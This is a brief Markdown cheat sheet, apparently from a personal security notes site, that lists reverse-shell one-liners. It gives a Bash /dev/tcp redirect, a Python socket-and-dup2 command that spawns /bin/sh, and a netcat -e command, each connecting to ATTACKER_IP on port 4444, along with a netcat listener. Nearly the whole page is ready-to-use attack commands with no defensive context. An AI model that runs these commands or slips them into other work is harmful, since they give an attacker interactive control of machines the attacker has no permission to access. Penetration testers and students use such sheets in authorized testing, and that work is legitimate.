---
title: Reverse Shells
parent: Tools & Notes
nav_order: 2
---

# Reverse Shell Cheatsheet

## Bash

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

## Python

```python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

## Netcat

```bash
nc -e /bin/sh ATTACKER_IP 4444
```

## Listener

```bash
nc -lvnp 4444
```
